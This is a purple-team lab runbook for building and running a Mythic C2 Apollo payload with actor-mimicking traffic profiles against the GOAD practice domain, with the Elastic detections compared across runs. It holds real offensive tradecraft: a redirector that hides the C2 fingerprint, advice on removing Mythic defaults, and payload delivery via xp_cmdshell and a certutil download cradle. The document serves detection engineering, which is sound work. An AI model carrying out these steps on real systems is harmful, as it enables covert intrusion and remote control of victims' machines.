# Runbook: build and run, once the lab VPN is back

Prereqs: lab VPN up (the `utun8` tunnel that died last session), Mythic reachable at
`10.23.20.10:7443` (UI access per the `reference_mythic_access` note), Kali `192.168.36.100`, Nawi /
Elastic on the blue side. GOAD VLANs for the target (castleblack etc.).

## 0. Confirm connectivity

```bash
# VPN + reachability
ifconfig utun8 | grep inet
curl -sk https://10.23.20.10:7443 -o /dev/null -w '%{http_code}\n'   # expect 200/302
ssh kali@192.168.36.100 'echo ok'
```

## 1. Install the containers (once, on the Mythic host)

```bash
cd /path/to/Mythic
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/httpx
sudo ./mythic-cli c2 start httpx
sudo ./mythic-cli status         # Apollo + httpx should be green
```

## 2. Stand up a redirector (Track 1 realism)

On a throwaway VPS (or a lab VM standing in for one):
- Point a domain's A record at it, get a Let's Encrypt cert (`certbot`).
- Drop `redirectors/nginx.conf`, fill in `REDIR_DOMAIN`, `MYTHIC_HTTPX_UPSTREAM`
  (`http://10.23.20.10:<httpx-port>`), `DECOY_URL`. `nginx -t && systemctl reload nginx`.
- This is the step that makes the internet-facing JA3S/JARM a normal nginx stack instead of the
  Mythic listener fingerprint.

For a first pass with no redirector, point the payload straight at the httpx listener and skip the
TLS-fingerprint lesson (that becomes Run 1).

## 3. Build the Apollo payload

Mythic UI -> Create Payload -> Windows -> Apollo -> httpx:
- `raw_c2_config`: paste `profiles/lockbit-icbc.httpx.toml` (or `qilin-ocsp.httpx.toml`).
- Callback host: the redirector FQDN (or `10.23.20.10` for the no-redirector run).
- Injection target `wuauclt.exe`; SMB pipe `fullduplex_84` if building the P2P variant.
- Output: WinExe (or service/DLL as the scenario needs).

## 4. Deliver in GOAD (reuse the Episode 1 chain) — LAB ACCESS SHIM

> **Lab access shim, not actor initial access (F5).** The SQL RCE path (xp_cmdshell + certutil)
> is a convenience to get the agent running; it reflects none of the modeled actors' delivery
> (FIN7 spearphish/more_eggs, LockBit Citrix Bleed, FIN8 msxsl.exe). Do not count it as
> initial-access coverage. For FIN7 ordering/initial access adopt the CTID FIN7 plan —
> see `tasks/F5-fin7-killchain-ordering.md`.

Host the payload on Kali and deliver via the documented SQL RCE path (xp_cmdshell on castelblack,
certutil LOLBIN or PowerShell cradle), exactly as in the Episode 1 writeup. Verify the callback
lands in the Mythic UI.

```bash
# on Kali
python3 -m http.server 8000            # serve the payload
# then trigger via impacket-mssqlclient xp_cmdshell certutil ... (see Episode 1 doc)
```

## 5. Blue side: watch Nawi

Run the two-run exercise from `detections/elastic-sysmon.md`:
- Run 1: default `http` profile, confirm static detections fire.
- Run 2: this httpx profile behind the LE redirector, confirm which behavioral detections survive
  (JA4H mismatch, RITA periodicity, low URI cardinality, CLR-load + ETW gap, `fullduplex_84` pipe,
  wuauclt injection).

## 6. Script the full kill chain (optional, higher fidelity)

Drive the CTID FIN7 or FIN6 emulation plan over the Apollo session so the detections fire in a
realistic sequence. Unit-test individual detections with Atomic Red Team first.

## Gotchas (from the lab notes)

- Inter-VLAN routing: the callback host must be reachable from the target VLAN (GOAD VLAN20 in
  Episode 1). Confirm the redirector/listener is routable from castelblack.
- Do NOT reuse the Mythic defaults on anything you want to be a fair test: change server port 7443,
  the `O=Mythic` cert issuer, and the reused E-Tags, or Run 2 is trivially fingerprintable as Mythic
  itself rather than as the actor.
- Mac VPN caveat: `utun4` up routes `192.168.36.0/24` into the tunnel; dev and prod are mutually
  exclusive from the Mac (see `feedback_prod_vpn_hijacks_dev_subnet`).
